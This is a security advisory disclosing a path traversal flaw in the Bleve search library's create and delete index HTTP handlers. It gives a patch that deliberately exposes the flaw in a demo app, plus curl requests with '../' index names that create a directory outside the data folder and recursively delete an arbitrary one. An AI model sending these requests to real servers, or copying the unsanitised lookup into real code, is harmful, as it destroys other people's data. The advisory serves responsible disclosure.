---
title: 'Bleve Library: Traversal Vulnerabilities in Create / Delete IndexHandler'
severity: Low
ghsa_id: GHSA-gc7p-j7x8-h873
cve_id: null
weaknesses: []
products:
- ecosystem: Go
  package_name: Bleve Library
  affected_versions: '> v0.1.0'
  patched_versions: ''
cvss: null
credits: []
---

**Summary**
This is a path traversal vulnerability that impacts the CreateIndexHandler and DeleteIndexHandler found within Bleve search library.  These vulnerabilities enable the attacker to delete any directory owned by the user recursively, and create a new directory in any location which the server has write permissions to.

**Severity**
Low - The vulnerability only affects applications using these esoteric HTTP handlers, if not sanitized to prevent path traversal in the index name.

**Proof of Concept**
Please leverage the patched Bleve Explorer demo application [here](https://github.com/blevesearch/bleve-explorer).

The patch to expose the vulnerability is on github at [path-traversal.patch](https://github.com/google/security-research/tree/master/pocs/bleve):

Viewers can download

```
Viewers can download
diff --git a/http_util.go b/http_util.go
index 926a3e0..0e34f14 100644
--- a/http_util.go
+++ b/http_util.go
@@ -78,6 +78,10 @@ func indexNameLookup(req *http.Request) string {
 	return muxVariableLookup(req, "indexName")
 }
 
+func crapIndexNameLookup(req *http.Request) string {
+	return req.URL.Query()["indexName"][0]
+}
+
 func showError(w http.ResponseWriter, r *http.Request,
 	msg string, code int) {
 	log.Printf("Reporting error %v/%v", code, msg)
diff --git a/main.go b/main.go
index 0a1148b..2cfed51 100644
--- a/main.go
+++ b/main.go
@@ -98,16 +98,16 @@ func main() {
 	bleveMappingUI.RegisterHandlers(router, "/api")
 
 	createIndexHandler := bleveHttp.NewCreateIndexHandler(*dataDir)
-	createIndexHandler.IndexNameLookup = indexNameLookup
-	router.Handle("/api/{indexName}", createIndexHandler).Methods("PUT")
+	createIndexHandler.IndexNameLookup = crapIndexNameLookup
+	router.Handle("/api/create", createIndexHandler).Methods("PUT")
 
 	getIndexHandler := bleveHttp.NewGetIndexHandler()
 	getIndexHandler.IndexNameLookup = indexNameLookup
 	router.Handle("/api/{indexName}", getIndexHandler).Methods("GET")
 
 	deleteIndexHandler := bleveHttp.NewDeleteIndexHandler(*dataDir)
-	deleteIndexHandler.IndexNameLookup = indexNameLookup
-	router.Handle("/api/{indexName}", deleteIndexHandler).Methods("DELETE")
+	deleteIndexHandler.IndexNameLookup = crapIndexNameLookup
+	router.Handle("/api/delete", deleteIndexHandler).Methods("DELETE")
 
 	listIndexesHandler := bleveHttp.NewListIndexesHandler()
 	router.Handle("/api", listIndexesHandler).Methods("GET")

```

To start the patched demo application:

```
git clone git@github.com:blevesearch/bleve-explorer.git
cd bleve-explorer
patch -p1 < path/to/path-traversal.patch
mkdir data
go build
./bleve-explorer
```
Now the server is running, you can call CreateIndexHandler with any path:

curl -XPUT localhost:8095/api/create?indexName=../controlled-by-user

Observe that a directory called “controlled-by-user” is created at the same level as the data directory created above, which is supposed to contain the indexes.

```

$ ls -lR controlled-by-user
controlled-by-user:
total 8
-rw-r--r-- 1 u g   42 Mar  2 17:07 index_meta.json
drwx------ 2 u g 4096 Mar  2 17:07 store

controlled-by-user/store:
total 32
-rw------- 1 u g 65536 Mar  2 17:07 root.bolt

```
The contents of this directory aren't controlled by the attacker through this vulnerability, but might be manipulated elsewhere through the vulnerable application.

However if the application - like the patched demo application - uses both CreateIndexHandler and DeleteIndexHandler without itself sanitizing the index name, then any directory writable by the user running the server can be deleted recursively.

First run CreateIndexHandler, which doesn’t complain that the directory already exists and add its contents alongside any existing contents, and then DeleteIndexHandler will delete the entire directory recursively:

```
$ mkdir -p some-directory/nested
$ echo hello > some-directory/nested/world
$ curl -XPUT localhost:8095/api/create?indexName=../some-directory
{"status":"ok"}
$ ls -lR some-directory/
some-directory/:
total 12
-rw-r--r-- 1 u g   42 Mar  2 17:55 index_meta.json
drwxr-xr-x 2 u g 4096 Mar  2 17:54 nested
drwx------ 2 u g 4096 Mar  2 17:55 store

some-directory/nested:
total 4
-rw-r--r-- 1 u g 6 Mar  2 17:54 world

some-directory/store:
total 32
-rw------- 1 u g 65536 Mar  2 17:55 root.bolt
$ curl -XDELETE localhost:8095/api/delete?indexName=../some-directory
{"status":"ok"}
$ ls -lR some-directory/
ls: cannot access 'some-directory/': No such file or directory

```

**Further Analysis**
N/A

**Timeline**
**Date reported**: 03/09/2022
**Date fixed**: The Bleve developers decided not to fix this, but to document the risk instead.
**Date disclosed**: 07/01/2022